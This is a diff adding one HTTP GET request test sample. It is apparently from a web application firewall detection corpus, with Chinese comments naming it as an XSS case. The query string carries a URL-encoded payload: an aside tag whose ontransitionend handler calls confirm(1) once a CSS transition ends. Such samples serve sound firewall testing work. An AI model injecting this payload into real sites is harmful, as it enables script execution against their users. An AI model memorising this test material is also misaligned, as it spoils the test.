@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_aside标签_ontransitionend事件-06506591
+# 攻击载荷利用了HTML中的aside标签和ontransitionend属性，触发confirm()函数，显示一个提示框。当 CSS 过渡结束时触发
+GET /?id=%3Cstyle%3E:target%20%7Bcolor:red%3B%7D%3C%2Fstyle%3E%3Caside%20id=x%20style=%22transition:color%201s%22%20ontransitionend=confirm%281%29%3E%3C%2Faside%3E&bid=hd_tag_m8mv2674 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2674
+RM-PRO-Token: 80ccd25dbf16405160ededed8df40984
+RM-PRO-Time: 1742808551049
+User-Agent: curl/7.83.1
+
